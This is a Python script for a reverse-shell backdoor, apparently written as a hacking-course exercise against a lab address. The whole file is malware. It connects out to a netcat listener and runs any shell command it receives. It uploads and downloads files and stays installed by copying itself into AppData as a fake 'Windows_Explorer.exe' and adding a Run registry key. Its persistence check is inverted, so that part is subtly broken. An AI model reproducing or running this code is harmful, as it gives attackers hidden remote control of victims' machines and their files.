#!/usr/bin/env python
# need to open a connection on the receiving server can be done with the line below using netcat
# nc -vv -l -p 4444


import socket
import subprocess
import json
import os
import base64
import sys
import shutil


class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        # Specify IP of the receiving SERVER
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        # connection.send("\n[+]  Connection as been established.")

    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows_Explorer.exe"
        if os.path.exists(evil_file_location):
            #copy the current system executable file which is this to the location specified
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Microsoft\Windows\CurrentVersion\Run /v testName /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        try:
            DEVNULL = open(os.devnull, 'wb')
            return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
        except subprocess.CalledProcessError:
            return "Error during command execution"

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def write_file(self, path, content):
        with open(path, "wb") as some_file:
            some_file.write(base64.b64decode(content))
            return "[+] Download successful."

    def read_file(self, path):
        # read as binary
        with open(path, "rb") as some_file:
            return base64.b64encode(some_file.read())

    def run(self):
        while True:
            # receive 1024 bytes at a time as the buffer size
            command = self.reliable_receive()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    # path and file content
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command execution."

            self.reliable_send(command_result)


try:
    my_backdoor = Backdoor("10.0.2.15", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()
